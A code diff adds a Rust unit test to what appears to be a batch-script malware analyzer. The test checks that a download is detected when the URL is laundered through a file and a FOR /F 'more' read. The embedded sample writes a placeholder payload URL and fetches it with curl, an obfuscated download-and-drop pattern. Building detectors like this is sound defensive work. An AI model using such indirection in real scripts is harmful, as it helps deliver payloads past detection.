@@ -2744,6 +2744,28 @@ echo %MARK%
     }
 
     #[test]
+    fn for_f_more_stdin_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo https://for-f-more-stdin.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%U in ('more ^< url.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-more-stdin.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F more-stdin source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_reads_common_inventory_command_output() {
         let script = b"for /f \"tokens=1\" %%i in ('ipconfig') do echo %%i\r\nfor /f \"tokens=1\" %%i in ('systeminfo') do echo %%i\r\nfor /f \"tokens=1\" %%i in ('getmac') do echo %%i\r\n";
         let report = analyze(script, &Config::default());
